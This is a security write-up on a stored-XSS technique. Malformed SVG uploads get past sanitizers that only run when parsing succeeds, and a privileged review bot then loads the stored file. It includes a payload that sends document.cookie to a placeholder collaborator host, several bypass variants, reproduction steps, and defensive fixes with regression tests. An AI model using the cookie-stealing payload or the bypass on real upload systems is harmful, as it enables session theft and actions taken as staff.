# Upload Parser Failure — SVG Left Alone

## Date

2026-07-09

## Target Type

File-upload features that sanitize readable SVG/XML but store unreadable uploads unchanged

## Bug Class

Stored XSS, upload sanitization bypass via parser failure, unsafe `Content-Type` on stored objects, admin/review bot abuse

## Initial Signal

Look for lab or app copy like:

- "stripped, pressed, hung"
- "the ones we can't read, we leave alone"
- different handling for valid vs invalid images
- SVG uploads with a sanitizer for well-formed XML

Also check:

- upload accepts `.svg`
- stored files served from `/items/`, `/uploads/`, or similar on app origin
- reviewer trigger such as `/api/send`, `/api/report`, `/api/review`

## Pattern

Two-path upload logic:

```text
parser succeeds -> sanitize / re-encode / strip active content
parser fails     -> store original bytes unchanged
```

For SVG XSS, the goal is to make the server **fail to parse** while still passing extension/MIME checks.

Working shape:

```xml
<svg xmlns="http://www.w3.org/2000/svg"><script>
fetch('https://[collaborator]/?c='+encodeURIComponent(document.cookie))
</script>
```

Intentionally omit closing tags or break XML validity so the sanitizer never runs.

## Trust Boundary

User uploads must not become active HTML/JavaScript on the application origin. Review bots must not open untrusted uploaded content with privileged cookies unless the content is guaranteed inert.

## Minimal Reproduction

1. Upload well-formed SVG with `<script>` and confirm sanitization strips it.
2. Upload malformed SVG with the same script and confirm the body survives.
3. Inspect response headers on the stored URL.
4. Look for `Content-Type: text/html` or other active rendering types.
5. Trigger the review bot on the stored hash.
6. Confirm execution via collaborator callback or logs.

## Why Failed Tests Fail

- The app rejects malformed XML instead of storing it.
- Parser-failure files are still served as `image/svg+xml` without script execution.
- Uploads are served from a cookieless CDN origin.
- Cookies are `HttpOnly`, requiring in-origin fetch instead of `document.cookie`.
- Review bot only inspects metadata/thumbnails, not the raw file URL.

## Why Working Tests Work

The sanitizer is tied to successful parsing. When parsing fails, the server stores attacker bytes and may serve them with a browser-executable content type from the first-party origin. The review bot then loads that URL directly.

## Alternate Variants To Test

| Variant | Notes |
|---------|-------|
| Unclosed `<script>` / missing `</svg>` | Most reliable parser-failure trigger observed |
| Invalid XML characters / bad namespaces | May also skip sanitizer |
| `foreignObject` + `img onerror` | Worked in some cases even when well-formed, but less general than parser failure |
| PNG magic + HTML tail | Often stored raw, but usually still served as `image/png` |

## Impact

- Stored XSS against staff/admin bots
- Cookie, session, or flag disclosure
- Same-origin actions as the reviewer

## Fix

- Reject malformed SVG/XML uploads
- Run sanitization on a best-effort basis even for parser failures, or refuse storage
- Never serve unknown upload bytes as `text/html`
- Rasterize SVG to PNG server-side when images are required
- Serve uploads from an isolated origin
- Use `HttpOnly` on sensitive cookies

## Regression Test

All of the following must fail:

```xml
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script>
```

```xml
<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror=alert(1)></body></foreignObject></svg>
```

Reviewer sessions must not execute uploaded content.

## Future Checklist Item

If upload copy distinguishes readable vs unreadable inputs, test malformed SVG/XML **before** PNG polyglot and object-storage `Content-Type` override work.
